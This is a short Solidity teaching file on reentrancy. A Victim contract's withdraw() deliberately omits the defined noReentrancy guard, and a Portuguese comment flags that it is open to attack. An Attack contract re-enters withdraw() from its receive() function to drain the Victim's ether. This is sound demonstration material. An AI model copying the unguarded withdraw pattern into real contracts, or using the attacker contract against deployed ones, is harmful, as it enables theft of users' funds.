// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

abstract contract ReentrancyGuard {
  error NoReentrancy();
  bool locked;

  modifier noReentrancy() {
    if (locked) {
      revert NoReentrancy();
    }
    locked = true;
    _;
    locked = false;
  }
}

contract Victim is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    // Use o modifier noReentrancy, caso contrário a função abaixo pode sofre ataques.
    function withdraw() external  {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "value is less than 0");
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Failed");
    }
}

contract Attack {
    Victim public victim;

    constructor(Victim _victim) {
        victim = _victim;
    }

    receive() external payable { 
        if(address(victim).balance > 1 ether) {
            victim.withdraw();
        }
    }

    function attack() external  payable {
        require(msg.value >= 1 ether, "minimal value is 1 ether");
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }
}